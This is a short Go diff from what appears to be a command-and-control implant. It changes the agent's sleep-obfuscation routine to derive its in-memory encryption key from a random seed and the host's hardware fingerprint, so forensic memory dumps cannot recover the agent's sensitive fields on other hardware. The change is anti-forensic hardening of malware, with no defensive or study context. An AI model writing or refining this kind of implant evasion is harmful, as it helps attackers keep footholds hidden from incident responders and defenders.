@@ -104,12 +104,17 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 
 	vault := &sleepVault{}
 
-	// Generate random AES-256 key for this sleep cycle
-	vault.key = make([]byte, 32)
-	if _, err := rand.Read(vault.key); err != nil {
+	// Generate hardware-bound AES-256 key for this sleep cycle.
+	// HKDF mixes a random seed with the machine's hardware fingerprint,
+	// so the key cannot be reconstructed on different hardware from a
+	// memory dump that captures only the seed.
+	seed := make([]byte, 32)
+	if _, err := rand.Read(seed); err != nil {
 		log.Printf("mask key error: %v", err)
 		return nil
 	}
+	vault.key = deriveHardwareBoundKey(seed)
+	zeroBytes(seed)
 
 	// --- Encrypt agent sensitive fields ---
 	ad := agentSensitiveData{
